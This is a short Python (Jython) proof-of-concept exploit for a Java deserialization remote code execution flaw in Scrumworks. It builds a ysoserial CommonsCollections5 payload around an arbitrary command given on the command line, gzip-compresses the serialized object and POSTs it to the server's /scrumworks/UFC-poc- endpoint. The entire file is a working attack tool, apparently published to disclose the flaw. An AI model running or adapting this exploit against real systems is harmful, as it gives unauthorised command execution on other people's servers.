---
#
# Scrumworks Java Deserialization Remote Code Execution PoC
# 
import httplib
import urllib
import sys

import binascii

# load the ysoserial.jar file 
sys.path.append("./ysoserial.jar")

from ysoserial import *
from ysoserial.payloads import *

# ZIP support
from java.io import ByteArrayOutputStream
from java.io import ObjectOutputStream
from java.util.zip import GZIPOutputStream


print "Scrumworks Java Deserialization Remote Code Execution PoC"
print "========================================================="

if len(sys.argv) != 4:
  print "usage: " + sys.argv[0] + " host port command\n"  
  exit(3)

payloadName = "CommonsCollections5"
payloadClass = ObjectPayload.Utils.getPayloadClass(payloadName);

if payloadClass is None:
  print("Can't load ysoserial payload class")
  exit(2);

# serialize payload
payload = payloadClass.newInstance()
exploitObject = payload.getObject(sys.argv[3])

# create streams
byteStream = ByteArrayOutputStream()
zipStream = GZIPOutputStream(byteStream)
objectStream = ObjectOutputStream(zipStream) 
objectStream.writeObject(exploitObject)

# close streams
objectStream.flush()
objectStream.close()
zipStream.close()
byteStream.close()

# http request
print "sending serialized command"
conn = httplib.HTTPConnection(sys.argv[1] + ":" + sys.argv[2])
conn.request("POST", "/scrumworks/UFC-poc-", byteStream.toByteArray())
response = conn.getresponse()
conn.close()
print "done"
---